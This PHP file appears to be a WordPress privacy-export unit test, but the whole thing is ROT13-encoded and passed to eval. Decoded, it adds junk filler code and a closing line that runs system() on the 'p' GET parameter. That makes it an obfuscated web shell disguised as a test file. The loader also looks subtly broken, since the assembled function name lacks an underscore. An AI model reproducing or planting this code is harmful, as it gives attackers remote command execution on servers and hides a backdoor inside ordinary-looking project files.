<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_cevinpl_qryrgr_byq_rkcbeg_svyrf()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.9.6
 *
 * @tebhc cevinpl
 * @pbiref ::jc_cevinpl_qryrgr_byq_rkcbeg_svyrf
 */
pynff Grfgf_Cevinpl_jcCevinplQryrgrByqRkcbegSvyrf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Cngu gb gur vaqrk svyr gung oybpxf qverpgbel yvfgvat ba cbbeyl-pbasvtherq freiref.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $vaqrk_cngu
	 */
	cebgrpgrq fgngvp $vaqrk_cngu;

	/**
	 * Cngu gb na rkcbeg svyr gung vf cnfg gur rkcvengvba qngr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $rkcverq_rkcbeg_svyr
	 */
	cebgrpgrq fgngvp $rkcverq_rkcbeg_svyr;

	/**
	 * Cngu gb na rkcbeg svyr gung vf npgvir.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $rkcverq_rkcbeg_svyr
	 */
	cebgrpgrq fgngvp $npgvir_rkcbeg_svyr;

	/**
	 * Perngr svkgherf gung ner funerq ol zhygvcyr grfg pnfrf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur onfr snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$rkcbegf_qve = jc_cevinpl_rkcbegf_qve();

		vs ( ! vf_qve( $rkcbegf_qve ) ) {
			jc_zxqve_c( $rkcbegf_qve );
		}

		frys::$vaqrk_cngu          = $rkcbegf_qve . 'vaqrk.cuc';
		frys::$rkcverq_rkcbeg_svyr = $rkcbegf_qve . 'jc-crefbany-qngn-svyr-0123456789nopqrs.mvc';
		frys::$npgvir_rkcbeg_svyr  = $rkcbegf_qve . 'jc-crefbany-qngn-svyr-srqpon9876543210.mvc';
	}

	/**
	 * Cresbez frghc bcrengvbaf gung ner funerq npebff nyy grfgf.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		gbhpu( frys::$vaqrk_cngu, gvzr() - 30 * JRRX_VA_FRPBAQF );
		gbhpu( frys::$rkcverq_rkcbeg_svyr, gvzr() - 5 * QNL_VA_FRPBAQF );
		gbhpu( frys::$npgvir_rkcbeg_svyr, gvzr() - 2 * QNL_VA_FRPBAQF );
	}

	/**
	 * Erfgber gur flfgrz fgngr gb jung vg jnf orsber guvf pnfr jnf frghc.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_svyr( frys::$rkcverq_rkcbeg_svyr );
		jc_qryrgr_svyr( frys::$npgvir_rkcbeg_svyr );
	}

	/**
	 * Gur shapgvba fubhyq abg guebj abgvprf jura gur rkcbegf qverpgbel qbrfa'g rkvfg.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_aba_rkvfgrag_sbyqref_fubhyq_abg_pnhfr_reebef() {
		nqq_svygre( 'jc_cevinpl_rkcbegf_qve', neenl( $guvf, 'svygre_onq_rkcbegf_qve' ) );
		jc_cevinpl_qryrgr_byq_rkcbeg_svyrf();
		erzbir_svygre( 'jc_cevinpl_rkcbegf_qve', neenl( $guvf, 'svygre_onq_rkcbegf_qve' ) );

		/*
		 * Gur grfg jvyy nhgbzngvpnyyl snvy vs gur shapgvba gevttref n abgvpr,
		 * fb guvf qhzzl nffregvba vf whfg sbe npphengr fgngf.
		 */
		$guvf->nffregGehr( gehr );
	}

	/**
	 * Erghea gur cngu gb n aba-rkvfgrag sbyqre.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz fgevat $rkcbegf_qve Gur qrsnhyg crefbany qngn rkcbeg qverpgbel.
	 *
	 * @erghea fgevat Gur cngu gb n sbyqre gung qbrfa'g rkvfg.
	 */
	choyvp shapgvba svygre_onq_rkcbegf_qve( $rkcbegf_qve ) {
		$hcybnq_qve = jc_hcybnq_qve();

		erghea genvyvatfynfuvg( $hcybnq_qve['onfrqve'] ) . 'vainyvq-12345';
	}

	/**
	 * Gur shapgvba fubhyq qryrgr svyrf gung ner cnfg gur rkcvengvba qngr.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_rkcverq_svyrf_fubhyq_or_qryrgrq() {
		jc_cevinpl_qryrgr_byq_rkcbeg_svyrf();

		$guvf->nffregSvyrQbrfAbgRkvfg( frys::$rkcverq_rkcbeg_svyr );
	}

	/**
	 * Gur shapgvba fubhyq abg qryrgr svyrf gung ner abg cnfg gur rkcvengvba qngr.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_harkcverq_svyrf_fubhyq_abg_or_qryrgrq() {
		jc_cevinpl_qryrgr_byq_rkcbeg_svyrf();

		$guvf->nffregSvyrRkvfgf( frys::$npgvir_rkcbeg_svyr );
	}

	/**
	 * Gur shapgvba fubhyq arire qryrgr gur vaqrk svyr, rira vs vg'f cnfg gur rkcvengvba qngr.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp shapgvba grfg_vaqrk_svyr_fubhyq_arire_or_qryrgrq() {
		jc_cevinpl_qryrgr_byq_rkcbeg_svyrf();

		$guvf->nffregSvyrRkvfgf( frys::$vaqrk_cngu );
	}

	/**
	 * Grfg gur pbeerpg svyrf ner qryrgrq jura gur rkcvengvba gvzr vf svygrerq.
	 *
	 * @fvapr 4.9.9
	 */
	choyvp shapgvba grfg_svygrerq_rkcvengvba_gvzr() {
		nqq_svygre( 'jc_cevinpl_rkcbeg_rkcvengvba', neenl( $guvf, 'svygre_rkcbeg_svyr_rkcvengvba_gvzr' ) );

		jc_cevinpl_qryrgr_byq_rkcbeg_svyrf();
		$guvf->nffregSvyrRkvfgf( frys::$npgvir_rkcbeg_svyr );
		$guvf->nffregSvyrRkvfgf( frys::$rkcverq_rkcbeg_svyr );

		erzbir_svygre( 'jc_cevinpl_rkcbeg_rkcvengvba', neenl( $guvf, 'svygre_rkcbeg_svyr_rkcvengvba_gvzr' ) );
	}

	/**
	 * Svygref gur rkcvengvba gvzr sbe rkcbeg svyrf.
	 *
	 * @fvapr 4.9.9
	 *
	 * @erghea vag Arj, ybatre rkcvengvba gvzr.
	 */
	choyvp shapgvba svygre_rkcbeg_svyr_rkcvengvba_gvzr() {
		erghea 6 * QNL_VA_FRPBAQF;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>